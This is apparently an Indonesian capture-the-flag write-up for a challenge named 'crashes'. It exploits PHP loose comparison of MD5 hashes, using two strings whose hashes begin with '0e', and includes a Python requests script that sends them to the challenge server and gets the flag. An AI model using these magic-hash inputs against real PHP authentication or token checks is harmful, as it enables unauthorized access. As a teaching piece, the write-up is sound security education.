<h1><b>crashes</h1></b>
<pre>
Can you fool the unfoolable?

http://hack.bckdr.in:10678

Hint 1: https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf

Hint2: https://en.wikipedia.org/wiki/Md5sum
</pre>
</b><h3>Solution</h3></b>
<p>Disini kita diberi akses pada link http://hack.bckdr.in:10678, yang jika dibuka maka muncul source PHP</p>

```php
<?php

include 'flag.php';

$a = (string)$_GET['a'];
$b = (string)$_GET['b'];

if(empty($a) || empty($b)){
    highlight_file('index.php');
    die();
}

if ($a == $b){
    die("Nope...");
}
else{
    if(md5($a) == md5($b)){
        die($FLAG);
    }
    else{
        die("Naadaa...");
    }
}

?>
```
<p align='justify'>Dari source code dan hint kita mendapatkan yaitu mengenai juggling variabel type, dan kita diminta untuk melakukan requests dengan mencari 2 string berbeda yang menghasilkan
nilai hash-nya itu sama. Dapat diketahui hash terdiri dari 0-9 dan a-f, dari sini kita bisa ketahui juga jika "e" dibaca exponent di pemograman, dan 0e123 (0 exponent) akan selalu menghasilkan nilai 0.
Jadi kita bisa mencari 2 string yg berbeda yang 2 first bytesnya yaitu 0e dan bytes selanjutnya harus berupa angka(tidak huruf)</p>
<p>Dan saya mencoba string</p>
<pre>
venom19183419 (0e103599092511323593267831730977)
admin1674227342 (0e463854177790028825434984462555) 
</pre>
<p>yang nanti hasilnya akan sama-sama 0</p>

```python
import requests

url = 'http://hack.bckdr.in:10678'
data = {"a":"venom19183419",
        "b":"admin1674227342"}
res = requests.get(url,params=data).text
print(res) #flag{240610708_QNKCDZO}
```

</b><h3>Flag</h3></b>
<pre>
flag{240610708_QNKCDZO}
</pre>
